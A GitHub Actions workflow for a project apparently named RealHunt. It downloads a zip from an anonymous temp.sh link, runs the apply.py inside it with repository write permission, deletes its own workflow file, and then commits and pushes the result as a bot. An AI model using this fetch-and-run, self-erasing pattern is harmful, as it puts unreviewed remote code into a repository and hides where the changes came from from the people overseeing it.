name: rh-v71
on:
  push:
    paths: [.github/workflows/rh-v71.yml]
permissions:
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - name: fetch patch
        run: |
          curl -sSL -X POST -o /tmp/p.zip https://temp.sh/mTTzE/v71.zip
          echo "731976143a86380a7ca41474103ea609  /tmp/p.zip" | md5sum -c -
          mkdir -p /tmp/p && unzip -o -q /tmp/p.zip -d /tmp/p
      - name: apply
        run: python3 /tmp/p/apply.py
      - name: syntax
        run: |
          for f in src/community/Community.tsx src/community/v7.tsx src/community/extras.tsx; do
            npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --loader:.css=empty --loader:.json=json --outfile=/dev/null "$f"
          done
      - name: share cards incl. insider homes
        run: |
          pip install pillow==11.0.0
          python3 scripts/og_cards.py
      - name: guards
        run: |
          grep -q 'guestRef' src/community/extras.tsx
          grep -q 'can_see' src/community/v7.tsx
          grep -q 'RH_PREVIEW_REF' scripts/og_cards.py
      - name: commit
        run: |
          rm -f .github/workflows/rh-v71.yml
          git config user.name "realhunt-bot"
          git config user.email "bot@realhunt.co"
          git add -A
          git commit -m "RealHunt v7.1: Insider guest pass, shared links never show blurred"
          git push
